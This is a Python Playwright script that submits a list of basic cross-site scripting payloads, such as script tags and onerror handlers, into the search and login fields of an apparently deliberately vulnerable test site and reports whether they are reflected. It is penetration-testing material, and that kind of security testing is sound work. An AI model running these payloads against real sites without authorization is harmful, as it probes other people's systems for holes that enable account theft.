"""
XSS Vulnerability Test Script
Educational Purpose Only - Use only on authorized test environments
"""
from playwright.sync_api import sync_playwright

# Payloads for XSS testing (educational purposes)
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<details open ontoggle=alert('XSS')>"
]

def test_xss(url):
    """
    Test for XSS vulnerabilities - For authorized testing only
    """
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        
        # Navigate to the login page
        page.goto(url)
        
        # Test search field if available
        search_input = page.query_selector("input[name='searchFor']")
        if search_input:
            for payload in xss_payloads:
                search_input.fill(payload)
                submit_btn = page.query_selector("input[type='submit']")
                if submit_btn:
                    submit_btn.click()
                    page.wait_for_timeout(1000)
                    
                    # Check if payload is reflected
                    if payload in page.content():
                        print(f"[!] Potential XSS found with payload: {payload}")
        
        # Test username field
        username_field = page.query_selector("input[name='uname']")
        password_field = page.query_selector("input[name='pass']")
        
        if username_field and password_field:
            for payload in xss_payloads:
                username_field.fill(payload)
                password_field.fill("test")
                submit_btn = page.query_selector("input[type='submit']")
                if submit_btn:
                    submit_btn.click()
                    page.wait_for_timeout(1000)
                    
                    # Check if payload is reflected without sanitization
                    if payload in page.content():
                        print(f"[!] Potential XSS found in username field: {payload}")
        
        browser.close()
        print("Test completed.")

if __name__ == "__main__":
    target_url = "http://testphp.vulnweb.com/login.php"
    print(f"Testing XSS on: {target_url}")
    test_xss(target_url)

